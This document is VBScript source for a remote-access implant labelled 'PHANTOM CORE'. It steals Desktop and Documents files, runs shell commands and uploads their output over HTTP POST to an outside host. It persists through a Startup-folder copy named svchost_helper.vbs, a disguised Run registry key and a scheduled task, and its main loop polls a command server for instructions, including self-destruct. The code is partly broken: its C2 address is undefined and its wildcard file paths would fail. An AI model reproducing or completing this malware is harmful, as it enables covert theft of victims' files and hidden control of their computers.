' === PHANTOM CORE - 100% FILELESS ===
Function zExfil(zdata,zname)
    Set xhr = CreateObject("MSXML2.XMLHTTP")
    xhr.Open "POST", "https://httpbin.org/post", False  
    xhr.setRequestHeader "X-File-Name", zname
    xhr.setRequestHeader "Content-Type", "application/octet-stream"
    xhr.Send zdata
End Function

Function zSteal(zpath)
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(zpath) Then
        Set fil = fso.GetFile(zpath)
        Set stm = CreateObject("ADODB.Stream")
        stm.Type=1: stm.Open(): stm.LoadFromFile(zpath)
        zExfil stm.Read(), fso.GetBaseName(zpath)
        stm.Close()
    End If
End Function

Function zCmdShell(zcmd)
    Set sh = CreateObject("WScript.Shell")
    Set exe = sh.Exec("cmd /c " & zcmd)
    zCmdShell = exe.StdOut.ReadAll()
End Function

' === PERSISTANCE 3x (Run + Startup + Task Scheduler) ===
Sub zPersist()
    Set fso = CreateObject("Scripting.FileSystemObject")
    startup = fso.GetSpecialFolder(7) & "\svchost_helper.vbs"
    fso.CopyFile WScript.ScriptFullName, startup, True
    
    ' Registry (déguisé)
    Set sh = CreateObject("WScript.Shell")
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\RpcSsHelper", startup
    
    ' Task Scheduler
    sh.Run "schtasks /create /tn ""WindowsRpcHelper"" /tr """ & startup & """ /sc onlogon /rl limited /f", 0, True
End Sub

' === MAIN LOOP ===
zPersist()
Do
   
    Set xhr = CreateObject("MSXML2.XMLHTTP")
    xhr.Open "GET", C2 & "?t=" & Timer, False
    xhr.Send
    
    cmd = Trim(xhr.responseText)
    Select Case cmd
        Case "steal-desktop": zSteal Environ("USERPROFILE") & "\Desktop\*.txt"
        Case "steal-docs": zSteal Environ("USERPROFILE") & "\Documents\*.*"
        Case "whoami": zExfil zCmdShell("whoami /all"), "whoami.txt"
        Case "netstat": zExfil zCmdShell("netstat -an"), "netstat.txt"
        Case "ps": zExfil zCmdShell("tasklist /v"), "processes.txt"
        Case "selfdestruct": 
            Set fso = CreateObject("Scripting.FileSystemObject")
            fso.DeleteFile fso.GetSpecialFolder(7) & "\svchost_helper.vbs"
            sh.Run "schtasks /delete /tn ""WindowsRpcHelper"" /f", 0, True
            WScript.Quit
    End Select
    
    WScript.Sleep 14400000  
Loop
